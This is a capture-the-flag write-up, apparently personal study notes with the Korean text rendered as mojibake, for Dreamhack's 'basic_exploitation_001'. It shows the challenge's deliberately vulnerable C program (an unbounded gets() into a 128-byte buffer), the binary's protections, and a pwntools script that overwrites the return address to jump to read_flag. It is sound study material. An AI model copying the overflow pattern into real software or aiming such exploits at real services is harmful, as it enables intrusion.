## ğŸ“basic_exploitation_001

```
ì´ ë¬¸ì œëŠ” ì„œë²„ì—ì„œ ì‘ë™í•˜ê³  ìˆëŠ” ì„œë¹„ìŠ¤(basic_exploitation_001)ì˜ ë°”ì´ë„ˆë¦¬ì™€ ì†ŒìŠ¤ ì½”ë“œê°€ ì£¼ì–´ì§‘ë‹ˆë‹¤.  
í”„ë¡œê·¸ë¨ì˜ ì·¨ì•½ì ì„ ì°¾ê³  ìµìŠ¤í”Œë¡œì‡í•´ "flag" íŒŒì¼ì„ ì½ìœ¼ì„¸ìš”.  
"flag" íŒŒì¼ì˜ ë‚´ìš©ì„ ì›Œê²Œì„ ì‚¬ì´íŠ¸ì— ì¸ì¦í•˜ë©´ ì ìˆ˜ë¥¼ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
í”Œë˜ê·¸ì˜ í˜•ì‹ì€ DH{...} ì…ë‹ˆë‹¤.
```

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```


### ì†ŒìŠ¤ì½”ë“œ

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
	
    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {
    char buf[0x80];
    initialize();
    gets(buf);
    return 0;
}
```

![[{8C48088D-2EA8-4291-9662-01C8E1925881}.png]]

![[{6B5CA851-367C-469D-A02D-8A4961104865}.png]]

`read_flag` í•¨ìˆ˜ì˜ ì‹œì‘ ì£¼ì†Œ: `0x080485b9`

`gets` í•¨ìˆ˜ì—ì„œ ì…ë ¥ì˜ í¬ê¸°ë¥¼ ì œí•œí•˜ê³  ìˆì§€ ì•Šê¸° ë•Œë¬¸ì— ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ê³µê²©ì´ ê°€ëŠ¥í•˜ë‹¤.
128ë°”ì´íŠ¸ì˜ ë²„í¼ì™€ 4ë°”ì´íŠ¸ì˜ EBP(Extended Base Pointer)ë¥¼ ë”ë¯¸ ë°ì´í„°ë¡œ ì±„ìš°ê³ , ê·¸ ì´í›„ í˜¸ì¶œëœ ìœ„ì¹˜ë¡œ ëŒì•„ê°ˆ ë•Œ RETë¡œ `read_flag` í•¨ìˆ˜ì˜ ì‹œì‘ ì£¼ì†Œë¥¼ ì£¼ë©´ `read_flag` í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.


`$ python3 be1.py`

```python
from pwn import *

conn = remote('host3.dreamhack.games', 11943)

payload = b'A' * 0x84
payload += p32(0x080485b9)

conn.sendline(payload)

conn.interactive()
```

![[{6C625355-E5B7-438B-A7AB-7D20F3DB1A8E}.png]]

ğŸš©